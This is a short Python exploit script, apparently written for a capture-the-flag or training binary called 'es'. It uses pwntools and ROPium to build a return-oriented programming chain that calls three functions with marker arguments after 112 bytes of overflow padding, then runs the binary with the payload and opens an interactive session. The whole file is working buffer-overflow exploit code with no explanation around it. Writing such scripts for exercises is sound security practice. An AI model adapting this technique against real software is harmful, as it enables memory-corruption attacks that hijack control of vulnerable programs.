from ropium import *
from pwn import *

file_path = 'es'

EXE_FILE = file_path
exe = ELF(EXE_FILE)


rop = ROPium(ARCH.X64)
rop.load(file_path)
rop.abi = ABI.X86_CDECL
# rop.bad_bytes = [0x00]

chain = rop.compile('0x080491e5(0xdeadbeef)')
chain += rop.compile('0x08049236(0xcafebabe, 0x0badf00d)')
chain += rop.compile('0x080491b6()')


ropchain = b'A' * (108 + 4) + chain.dump('raw').replace(b'\x00',b'')
print(ropchain)
io = process([EXE_FILE, ropchain])  # executing the executable with ropchain as input
#
io.interactive()

